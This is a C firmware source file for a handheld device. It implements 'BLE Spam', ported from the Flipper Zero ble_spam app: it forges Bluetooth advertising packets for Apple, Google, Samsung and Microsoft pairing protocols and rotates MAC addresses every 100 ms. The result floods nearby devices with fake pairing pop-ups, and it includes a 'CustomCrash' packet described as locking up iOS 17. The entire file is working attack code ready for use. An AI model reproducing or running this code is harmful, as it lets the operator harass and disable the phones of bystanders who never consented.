/* See COPYING.txt for license details. */

/*
 * m1_ble_spam.c
 *
 * BLE Beacon Spam — dynamically generates advertising payloads that
 * trigger pairing / proximity notifications on nearby devices.
 *
 * Packet formats ported from the Flipper Zero / Momentum ble_spam app
 * (credit: @Willy-JL, @ECTO-1A, @Spooks4576) via the GhostESP
 * reference implementation.
 *
 * Key improvements over the previous static-payload approach:
 *   - Dynamic packet generation with per-cycle randomisation
 *   - MAC address rotation per packet (except Apple)
 *   - Fast ~100ms cycle time
 *   - Large model databases (19 Apple PP, 15 Apple NA, 80+ Google FP,
 *     20 Samsung Buds, 30 Samsung Watches)
 *   - Per-brand mode selection + Random mode
 *   - Three Apple Continuity types (ProximityPair, NearbyAction, CustomCrash)
 *   - Samsung Buds AND Watches
 *   - Microsoft SwiftPair with random device names
 */

/*************************** I N C L U D E S **********************************/
#include "app_freertos.h"
#include "cmsis_os.h"
#include "main.h"
#include "m1_lcd.h"
#include "m1_display.h"
#include "m1_menu.h"
#include "m1_tasks.h"
#include "m1_system.h"
#include "m1_compile_cfg.h"
#include "m1_ble_spam.h"
#include "m1_esp32_hal.h"
#include "m1_scene.h"
#include "esp_app_main.h"
#include "m1_log_debug.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#ifdef M1_APP_BLE_SPAM_ENABLE

/*************************** D E F I N E S ************************************/

#define M1_LOGDB_TAG  "BSPAM"

/* Time each advertising burst runs before rotating (ms) */
#define BLE_SPAM_ADV_MS         100

/* Button poll interval during advertising (ms) */
#define BLE_SPAM_POLL_MS        50

/* AT command response timeout (seconds) */
#define BLE_SPAM_AT_TIMEOUT     5

/* Delay between AT commands to avoid SPI transport overload (ms) */
#define BLE_SPAM_CMD_DELAY_MS   20

/* Response buffer size — must fit the echo + OK of the longest command
 * (AT+BLEADVDATA with 31 bytes = 62 hex chars) */
#define BLE_SPAM_RESP_BUF_SIZE  256

/************************** M O D E L   D A T A *******************************/

/*
 * All model databases below are ported from the Flipper Zero / Momentum
 * ble_spam app via the GhostESP reference implementation.
 */

/* --- Apple Continuity: ProximityPair device models (big-endian on wire) --- */
static const uint16_t apple_pp_models[] = {
    0x0E20, /* AirPods Pro */
    0x0A20, /* AirPods Max */
    0x0055, /* AirTag */
    0x0030, /* Hermes AirTag */
    0x0220, /* AirPods */
    0x0F20, /* AirPods 2nd Gen */
    0x1320, /* AirPods 3rd Gen */
    0x1420, /* AirPods Pro 2nd Gen */
    0x1020, /* Beats Flex */
    0x0620, /* Beats Solo 3 */
    0x0320, /* Powerbeats 3 */
    0x0B20, /* Powerbeats Pro */
    0x0C20, /* Beats Solo Pro */
    0x1120, /* Beats Studio Buds */
    0x0520, /* Beats X */
    0x0920, /* Beats Studio 3 */
    0x1720, /* Beats Studio Pro */
    0x1220, /* Beats Fit Pro */
    0x1620, /* Beats Studio Buds+ */
};
#define APPLE_PP_COUNT  (sizeof(apple_pp_models) / sizeof(apple_pp_models[0]))

/* --- Apple Continuity: NearbyAction action types --- */
static const uint8_t apple_na_actions[] = {
    0x13, /* AppleTV AutoFill */
    0x24, /* Apple Vision Pro */
    0x05, /* Apple Watch */
    0x27, /* AppleTV Connecting... */
    0x20, /* Join This AppleTV? */
    0x19, /* AppleTV Audio Sync */
    0x1E, /* AppleTV Color Balance */
    0x09, /* Setup New iPhone */
    0x2F, /* Sign in to other device */
    0x02, /* Transfer Phone Number */
    0x0B, /* HomePod Setup */
    0x01, /* Setup New AppleTV */
    0x06, /* Pair AppleTV */
    0x0D, /* HomeKit AppleTV Setup */
    0x2B, /* AppleID for AppleTV? */
};
#define APPLE_NA_COUNT  (sizeof(apple_na_actions) / sizeof(apple_na_actions[0]))

/* --- Google Fast Pair: 3-byte model codes --- */
static const uint32_t google_fp_models[] = {
    /* Non-production / forgotten devices */
    0x0001F0, 0x000047, 0x470000, 0x00000A, 0x0A0000,
    0x00000B, 0x0B0000, 0x00000D, 0x000007, 0x070000,
    0x000009, 0x090000, 0x000048, 0x001000, 0x00B727,
    0x01E5CE, 0x0200F0, 0x00F7D4, 0xF00002, 0xF00400,
    0x1E89A7,
    /* Phone setup */
    0x0577B1, 0x05A9BC,
    /* Genuine devices */
    0xCD8256, 0x0000F0, 0xF00000, 0x821F66, 0xF52494,
    0x718FA4, 0x0002F0, 0x92BBBD, 0x000006, 0x060000,
    0xD446A7, 0x2D7A23, 0x038B91, 0x02F637, 0x02D886,
    0xF00001, 0xF00201, 0xF00209, 0xF00305, 0xF00E97,
    0x04ACFC, 0x04AA91, 0x04AFB8, 0x05A963, 0x05AA91,
    0x05C452, 0x05C95C, 0x0602F0, 0x0603F0, 0x1E8B18,
    0x1E955B, 0x1EC95C, 0x06AE20, 0x06C197, 0x06C95C,
    0x06D8FC, 0x0744B6, 0x07A41C, 0x07C95C, 0x07F426,
    0x0102F0, 0x054B2D, 0x0660D7, 0x0103F0, 0x0903F0,
    0x9ADB11, 0x8B66AB,
    /* Custom / fun popups */
    0xD99CA1, 0x77FF67, 0xAA187F, 0xDCE9EA, 0x87B25F,
    0x1448C9, 0x13B39D, 0x7C6CDB, 0x005EF9, 0xE2106F,
    0xB37A62, 0x92ADC9,
};
#define GOOGLE_FP_COUNT (sizeof(google_fp_models) / sizeof(google_fp_models[0]))

/* --- Samsung EasySetup: Buds models (3-byte colour/model) --- */
static const uint32_t samsung_buds_models[] = {
    0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116,
    0x3D8F41, 0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17,
    0xD30704, 0x9DB006, 0x101F1A, 0x859608, 0x8E4503,
    0x2C6740, 0x3F6718, 0x42C519, 0xAE073A, 0x011716,
};
#define SAMSUNG_BUDS_COUNT (sizeof(samsung_buds_models) / sizeof(samsung_buds_models[0]))

/* --- Samsung EasySetup: Watch models (1-byte) --- */
static const uint8_t samsung_watch_models[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13,
    0x14, 0x15, 0x16, 0x17, 0x18, 0xE4, 0xE5, 0x1B,
    0x1C, 0x1D, 0x1E, 0x20, 0xEC, 0xEF,
};
#define SAMSUNG_WATCH_COUNT (sizeof(samsung_watch_models) / sizeof(samsung_watch_models[0]))

/************************** H E L P E R S *************************************/

/* Names shown on screen for each mode */
static const char *spam_mode_names[BLE_SPAM_MODE_COUNT] = {
    [BLE_SPAM_APPLE]     = "Apple",
    [BLE_SPAM_SAMSUNG]   = "Samsung",
    [BLE_SPAM_GOOGLE]    = "Google",
    [BLE_SPAM_MICROSOFT] = "Microsoft",
    [BLE_SPAM_RANDOM]    = "Random",
};

/* Random number in range [0, max) */
static uint32_t spam_rand(uint32_t max)
{
    if (max <= 1) return 0;
    return (uint32_t)rand() % max;
}

/* Fill buffer with random bytes */
static void spam_rand_bytes(uint8_t *buf, size_t len)
{
    for (size_t i = 0; i < len; i++)
        buf[i] = (uint8_t)(rand() & 0xFF);
}

/* Convert binary buffer to uppercase hex string */
static void bytes_to_hex(const uint8_t *src, size_t len, char *dst)
{
    static const char hex[] = "0123456789ABCDEF";
    for (size_t i = 0; i < len; i++) {
        dst[i * 2]     = hex[(src[i] >> 4) & 0x0F];
        dst[i * 2 + 1] = hex[src[i] & 0x0F];
    }
    dst[len * 2] = '\0';
}

/* Send an AT command and check for OK in the response.
 * Returns true on success (OK received), false on error/timeout. */
static bool spam_at(const char *cmd)
{
    char resp[BLE_SPAM_RESP_BUF_SIZE];
    spi_AT_send_recv(cmd, resp, sizeof(resp), BLE_SPAM_AT_TIMEOUT);
    osDelay(BLE_SPAM_CMD_DELAY_MS);
    return (strstr(resp, "OK") != NULL);
}

/********************* P A C K E T   B U I L D E R S *************************/

/*
 * All packet builders write raw BLE advertising data (AD structures) into buf.
 * They return the number of bytes written. Max 31 bytes.
 */

/* --- Apple Continuity: ProximityPair (type 0x07) --- */
static size_t build_apple_proximity_pair(uint8_t *buf)
{
    uint16_t model = apple_pp_models[spam_rand(APPLE_PP_COUNT)];

    /* AirTag models use prefix 0x05; others use 0x07 (new) or 0x01 (not yours) */
    uint8_t prefix;
    if (model == 0x0055 || model == 0x0030)
        prefix = 0x05;
    else
        prefix = spam_rand(2) ? 0x07 : 0x01;

    uint8_t i = 0;
    buf[i++] = 30;   /* AD length: 31 - 1 */
    buf[i++] = 0xFF;
    buf[i++] = 0x4C; /* Apple company ID (LE) */
    buf[i++] = 0x00;
    buf[i++] = 0x07; /* Continuity type: ProximityPair */
    buf[i++] = 25;   /* continuity data length */
    buf[i++] = prefix;
    buf[i++] = (model >> 8) & 0xFF;
    buf[i++] = model & 0xFF;
    buf[i++] = 0x55; /* status */
    buf[i++] = (uint8_t)((spam_rand(10) << 4) | spam_rand(10)); /* buds battery */
    buf[i++] = (uint8_t)((spam_rand(8) << 4) | spam_rand(10));  /* case battery */
    buf[i++] = (uint8_t)spam_rand(256); /* lid open counter */
    buf[i++] = (uint8_t)spam_rand(16);  /* color */
    buf[i++] = 0x00;
    spam_rand_bytes(&buf[i], 16); /* encrypted payload */
    i += 16;
    return i; /* 31 */
}

/* --- Apple Continuity: NearbyAction (type 0x0F) --- */
static size_t build_apple_nearby_action(uint8_t *buf)
{
    uint8_t action = apple_na_actions[spam_rand(APPLE_NA_COUNT)];
    uint8_t flags = 0xC0;
    if (action == 0x20 && spam_rand(2)) flags--; /* "Join This AppleTV?" variant */
    if (action == 0x09 && spam_rand(2)) flags = 0x40; /* glitched "Setup New Device" */

    uint8_t i = 0;
    buf[i++] = 10;   /* AD length */
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x0F; /* Continuity type: NearbyAction */
    buf[i++] = 5;    /* continuity data length */
    buf[i++] = flags;
    buf[i++] = action;
    spam_rand_bytes(&buf[i], 3); /* authentication tag */
    i += 3;
    return i; /* 11 */
}

/* --- Apple Continuity: CustomCrash (iOS 17 lockup — @ECTO-1A) --- */
static size_t build_apple_custom_crash(uint8_t *buf)
{
    uint8_t action = apple_na_actions[spam_rand(APPLE_NA_COUNT)];
    uint8_t flags = 0xC0;
    if (action == 0x20 && spam_rand(2)) flags--;
    if (action == 0x09 && spam_rand(2)) flags = 0x40;

    uint8_t i = 0;
    buf[i++] = 16;   /* AD length */
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x0F; /* NearbyAction */
    buf[i++] = 5;
    buf[i++] = flags;
    buf[i++] = action;
    spam_rand_bytes(&buf[i], 3); /* auth tag */
    i += 3;
    buf[i++] = 0x00; /* terminator */
    buf[i++] = 0x00;
    buf[i++] = 0x10; /* NearbyInfo continuity type */
    spam_rand_bytes(&buf[i], 3); /* junk data */
    i += 3;
    return i; /* 17 */
}

/* Randomly pick one of the three Apple types */
static size_t build_apple_adv(uint8_t *buf)
{
    switch (spam_rand(3)) {
        case 0:  return build_apple_proximity_pair(buf);
        case 1:  return build_apple_nearby_action(buf);
        default: return build_apple_custom_crash(buf);
    }
}

/* --- Google Fast Pair (UUID 0xFE2C) --- */
static size_t build_google_adv(uint8_t *buf)
{
    uint32_t model = google_fp_models[spam_rand(GOOGLE_FP_COUNT)];

    uint8_t i = 0;
    /* Flags */
    buf[i++] = 0x02;
    buf[i++] = 0x01;
    buf[i++] = 0x1A;
    /* 16-bit UUID list: 0xFE2C */
    buf[i++] = 0x03;
    buf[i++] = 0x03;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    /* Service Data for UUID 0xFE2C + 3-byte model */
    buf[i++] = 0x06;
    buf[i++] = 0x16;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    buf[i++] = (model >> 16) & 0xFF;
    buf[i++] = (model >> 8) & 0xFF;
    buf[i++] = model & 0xFF;
    /* Tx Power Level */
    buf[i++] = 0x02;
    buf[i++] = 0x0A;
    buf[i++] = (uint8_t)((int8_t)(spam_rand(120) - 100));
    return i; /* 17 */
}

/* --- Samsung EasySetup: Buds (28-byte packet) --- */
static size_t build_samsung_buds_adv(uint8_t *buf)
{
    uint32_t model = samsung_buds_models[spam_rand(SAMSUNG_BUDS_COUNT)];

    uint8_t i = 0;
    buf[i++] = 27;   /* length */
    buf[i++] = 0xFF;
    buf[i++] = 0x75; /* Samsung */
    buf[i++] = 0x00;
    buf[i++] = 0x42;
    buf[i++] = 0x09;
    buf[i++] = 0x81;
    buf[i++] = 0x02;
    buf[i++] = 0x14;
    buf[i++] = 0x15;
    buf[i++] = 0x03;
    buf[i++] = 0x21;
    buf[i++] = 0x01;
    buf[i++] = 0x09;
    buf[i++] = (model >> 16) & 0xFF;
    buf[i++] = (model >> 8) & 0xFF;
    buf[i++] = 0x01;
    buf[i++] = model & 0xFF;
    buf[i++] = 0x06;
    buf[i++] = 0x3C;
    buf[i++] = 0x94;
    buf[i++] = 0x8E;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0xC7;
    buf[i++] = 0x00;
    return i; /* 28 */
}

/* --- Samsung EasySetup: Watch (15-byte packet) --- */
static size_t build_samsung_watch_adv(uint8_t *buf)
{
    uint8_t model = samsung_watch_models[spam_rand(SAMSUNG_WATCH_COUNT)];

    uint8_t i = 0;
    buf[i++] = 14;
    buf[i++] = 0xFF;
    buf[i++] = 0x75; /* Samsung */
    buf[i++] = 0x00;
    buf[i++] = 0x01;
    buf[i++] = 0x00;
    buf[i++] = 0x02;
    buf[i++] = 0x00;
    buf[i++] = 0x01;
    buf[i++] = 0x01;
    buf[i++] = 0xFF;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x43;
    buf[i++] = model;
    return i; /* 15 */
}

/* Randomly pick buds or watch */
static size_t build_samsung_adv(uint8_t *buf)
{
    if (spam_rand(2))
        return build_samsung_buds_adv(buf);
    else
        return build_samsung_watch_adv(buf);
}

/* --- Microsoft SwiftPair (random device name) --- */
static size_t build_microsoft_adv(uint8_t *buf)
{
    static const char charset[] =
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    uint8_t name_len = (uint8_t)(spam_rand(7) + 2); /* 2–8 chars */
    char name[9];
    for (uint8_t n = 0; n < name_len; n++)
        name[n] = charset[spam_rand(sizeof(charset) - 1)];

    uint8_t i = 0;
    /* Flags */
    buf[i++] = 0x02;
    buf[i++] = 0x01;
    buf[i++] = 0x06;
    /* Manufacturer Specific: Microsoft Swift Pair */
    buf[i++] = (uint8_t)(6 + name_len); /* AD length */
    buf[i++] = 0xFF;
    buf[i++] = 0x06; /* Microsoft */
    buf[i++] = 0x00;
    buf[i++] = 0x03; /* Beacon ID: Swift Pair */
    buf[i++] = 0x00; /* Sub Scenario */
    buf[i++] = 0x80; /* Reserved RSSI byte */
    memcpy(&buf[i], name, name_len);
    i += name_len;
    return i;
}

/* Build a random-mode payload (picks a random brand) */
static size_t build_random_adv(uint8_t *buf, bool *is_apple_out)
{
    uint32_t r = spam_rand(4);
    *is_apple_out = (r == 0);
    switch (r) {
        case 0:  return build_apple_adv(buf);
        case 1:  return build_samsung_adv(buf);
        case 2:  return build_google_adv(buf);
        default: return build_microsoft_adv(buf);
    }
}

/********************* U I   H E L P E R S ************************************/

/* Mode selection menu */
#define MENU_ITEMS  BLE_SPAM_MODE_COUNT

static void draw_mode_menu(int sel)
{
    const uint8_t row_h   = m1_menu_item_h();
    const uint8_t max_vis = M1_MENU_VIS(MENU_ITEMS);

    m1_u8g2_firstpage();
    u8g2_SetDrawColor(&m1_u8g2, M1_DISP_DRAW_COLOR_TXT);

    /* Title */
    u8g2_SetFont(&m1_u8g2, M1_DISP_RUN_MENU_FONT_B);
    u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
    u8g2_DrawStr(&m1_u8g2, 2, 10, "BLE Spam");

    /* Menu items */
    u8g2_SetFont(&m1_u8g2, m1_menu_font());
    for (int i = 0; i < max_vis; i++) {
        int y = M1_MENU_AREA_TOP + i * row_h;
        if (i == sel) {
            u8g2_SetDrawColor(&m1_u8g2, M1_DISP_DRAW_COLOR_TXT);
            u8g2_DrawRBox(&m1_u8g2, 0, y - 1, M1_MENU_TEXT_W, row_h, 0);
            u8g2_SetDrawColor(&m1_u8g2, M1_DISP_DRAW_COLOR_BG);
        } else {
            u8g2_SetDrawColor(&m1_u8g2, M1_DISP_DRAW_COLOR_TXT);
        }
        u8g2_DrawStr(&m1_u8g2, 4, y + row_h - 1, spam_mode_names[i]);
    }
    u8g2_SetDrawColor(&m1_u8g2, M1_DISP_DRAW_COLOR_TXT);

    /* Scrollbar */
    {
        int track_y = M1_MENU_AREA_TOP - 1;
        int track_h = max_vis * row_h;
        u8g2_DrawFrame(&m1_u8g2, M1_MENU_SCROLLBAR_X, track_y, M1_MENU_SCROLLBAR_W, track_h);
        int handle_h = track_h / MENU_ITEMS;
        if (handle_h < 3) handle_h = 3;
        int handle_y = track_y + (sel * (track_h - handle_h)) / (MENU_ITEMS - 1);
        u8g2_DrawBox(&m1_u8g2, M1_MENU_SCROLLBAR_X, handle_y, M1_MENU_SCROLLBAR_W, handle_h);
    }

    m1_u8g2_nextpage();
}

/* Running screen */
static void draw_running_screen(ble_spam_mode_t mode, uint32_t pkt_count,
                                bool running)
{
    m1_u8g2_firstpage();
    u8g2_SetDrawColor(&m1_u8g2, M1_DISP_DRAW_COLOR_TXT);

    /* Title */
    u8g2_SetFont(&m1_u8g2, M1_DISP_RUN_MENU_FONT_B);
    u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
    u8g2_DrawStr(&m1_u8g2, 2, 10, "BLE Spam");

    u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
    /* Mode */
    char line[32];
    snprintf(line, sizeof(line), "Mode: %s", spam_mode_names[mode]);
    u8g2_DrawStr(&m1_u8g2, 2, 26, line);

    /* Packet counter */
    snprintf(line, sizeof(line), "Packets: %lu", (unsigned long)pkt_count);
    u8g2_DrawStr(&m1_u8g2, 2, 38, line);

    /* Status */
    u8g2_DrawStr(&m1_u8g2, 2, 50, running ? "Spamming..." : "Stopped");

    /* Bottom hint */
    if (running)
        m1_draw_bottom_bar(&m1_u8g2, NULL, "Stop", NULL, NULL);

    m1_u8g2_nextpage();
}

/* Check for button presses; returns true if BACK pressed */
static bool spam_check_back(void)
{
    S_M1_Main_Q_t  q_item;
    S_M1_Buttons_Status btn;

    if (xQueueReceive(main_q_hdl, &q_item, 0) != pdTRUE)
        return false;
    if (q_item.q_evt_type != Q_EVENT_KEYPAD)
        return false;
    if (xQueueReceive(button_events_q_hdl, &btn, 0) != pdTRUE)
        return false;

    return (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK);
}

/* Generate a random MAC address string "XX:XX:XX:XX:XX:XX" */
static void generate_random_mac_str(char *out, size_t out_size)
{
    uint8_t mac[6];
    spam_rand_bytes(mac, 6);
    /* Static random address: top two bits of the first octet = 11 */
    mac[0] |= 0xC0;
    /* BLE spec: lower 46 bits of a static random address must not be all zero */
    if (((mac[0] & 0x3F) | mac[1] | mac[2] | mac[3] | mac[4] | mac[5]) == 0)
        mac[1] = 0x01;
    snprintf(out, out_size, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

/*************** E N T R Y   P O I N T ***************************************/

void ble_spam_run(void)
{
    /* Seed PRNG */
    srand(HAL_GetTick());

    /* === Mode selection menu === */
    int mode_sel = 0;
    bool mode_chosen = false;

    draw_mode_menu(mode_sel);

    while (!mode_chosen)
    {
        S_M1_Main_Q_t  q_item;
        S_M1_Buttons_Status btn;

        if (xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(200)) == pdTRUE &&
            q_item.q_evt_type == Q_EVENT_KEYPAD &&
            xQueueReceive(button_events_q_hdl, &btn, 0) == pdTRUE)
        {
            if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
                return;
            if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK) {
                mode_sel = (mode_sel > 0) ? mode_sel - 1 : MENU_ITEMS - 1;
                draw_mode_menu(mode_sel);
            }
            if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK) {
                mode_sel = (mode_sel + 1) % MENU_ITEMS;
                draw_mode_menu(mode_sel);
            }
            if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
                mode_chosen = true;
        }
    }

    ble_spam_mode_t mode = (ble_spam_mode_t)mode_sel;

    /* === Init ESP32 === */
    if (!m1_esp32_get_init_status())
        m1_esp32_init();
    if (!get_esp32_main_init_status())
        esp32_main_init();
    if (!get_esp32_main_init_status())
    {
        m1_message_box(&m1_u8g2, "BLE Spam", "ESP32 not", "ready", " OK ");
        m1_esp32_deinit();
        return;
    }

    /* Clear stale responses before starting BLE operations */
    esp32_queue_reset();

    /* Init BLE in server role */
    if (!spam_at("AT+BLEINIT=2\r\n"))
    {
        m1_message_box(&m1_u8g2, "BLE Spam", "BLE init", "failed", " OK ");
        m1_esp32_deinit();
        return;
    }
    osDelay(200);

    /* Apple uses public address type for best effect; others use random */
    bool is_apple_mode = (mode == BLE_SPAM_APPLE);
    const char *adv_param_apple  = "AT+BLEADVPARAM=32,64,3,0,7,0\r\n";
    const char *adv_param_random = "AT+BLEADVPARAM=32,40,3,1,7,0\r\n";

    if (is_apple_mode)
        spam_at(adv_param_apple);
    else
        spam_at(adv_param_random);

    /* Drain stale button events before entering spam loop */
    {
        S_M1_Main_Q_t  q_item;
        S_M1_Buttons_Status btn;
        while (xQueueReceive(main_q_hdl, &q_item, 0) == pdTRUE) {
            if (q_item.q_evt_type == Q_EVENT_KEYPAD)
                xQueueReceive(button_events_q_hdl, &btn, 0);
        }
    }

    uint32_t pkt_count = 0;
    uint32_t last_draw = 0;
    bool stop = false;

    draw_running_screen(mode, pkt_count, true);

    /* === Main spam loop === */
    while (!stop)
    {
        /* 1. Build a dynamic payload */
        uint8_t adv_buf[31];
        size_t  adv_len = 0;
        bool    this_is_apple = false;

        switch (mode) {
            case BLE_SPAM_APPLE:
                adv_len = build_apple_adv(adv_buf);
                this_is_apple = true;
                break;
            case BLE_SPAM_SAMSUNG:
                adv_len = build_samsung_adv(adv_buf);
                break;
            case BLE_SPAM_GOOGLE:
                adv_len = build_google_adv(adv_buf);
                break;
            case BLE_SPAM_MICROSOFT:
                adv_len = build_microsoft_adv(adv_buf);
                break;
            case BLE_SPAM_RANDOM:
                adv_len = build_random_adv(adv_buf, &this_is_apple);
                break;
            default:
                adv_len = build_random_adv(adv_buf, &this_is_apple);
                break;
        }

        if (adv_len == 0) continue;

        /* 2. Stop any active advertisement */
        spam_at("AT+BLEADVSTOP\r\n");

        /* 3. Rotate MAC address — non-Apple protocols work with random
         *    static addresses, but Apple Continuity ProximityPair requires
         *    a public address to trigger device-pairing popups on iOS. */
        if (!this_is_apple) {
            char mac_str[18];
            generate_random_mac_str(mac_str, sizeof(mac_str));
            char mac_cmd[48];
            snprintf(mac_cmd, sizeof(mac_cmd), "AT+BLEADDR=1,\"%s\"\r\n", mac_str);
            spam_at(mac_cmd);
            /* Re-set advertising params for random addr */
            spam_at(adv_param_random);
        } else if (mode == BLE_SPAM_RANDOM) {
            /* Switched to Apple in random mode — use public addr */
            spam_at(adv_param_apple);
        }

        /* 4. Convert payload to hex and send */
        {
            char hex_str[63]; /* 31 * 2 + 1 */
            bytes_to_hex(adv_buf, adv_len, hex_str);
            char adv_cmd[96];
            snprintf(adv_cmd, sizeof(adv_cmd),
                     "AT+BLEADVDATA=\"%s\"\r\n", hex_str);
            spam_at(adv_cmd);
        }

        /* 5. Start advertising */
        spam_at("AT+BLEADVSTART\r\n");
        pkt_count++;

        /* 6. Wait for the advertising burst, checking for BACK */
        uint32_t remaining = BLE_SPAM_ADV_MS;
        while (remaining > 0 && !stop) {
            uint32_t chunk = (remaining > BLE_SPAM_POLL_MS) ? BLE_SPAM_POLL_MS : remaining;
            osDelay(chunk);
            remaining -= chunk;
            if (spam_check_back())
                stop = true;
        }

        /* 7. Update display periodically (not every packet — too fast) */
        uint32_t now = HAL_GetTick();
        if (now - last_draw >= 500) {
            draw_running_screen(mode, pkt_count, true);
            last_draw = now;
        }

        /* Restore adv params when switching back from Apple in random mode */
        if (this_is_apple && mode == BLE_SPAM_RANDOM) {
            spam_at(adv_param_random);
        }
    }

    /* === Clean up === */
    spam_at("AT+BLEADVSTOP\r\n");
    spam_at("AT+BLEINIT=0\r\n");

    draw_running_screen(mode, pkt_count, false);
    osDelay(500);
    m1_esp32_deinit();
}

#endif /* M1_APP_BLE_SPAM_ENABLE */
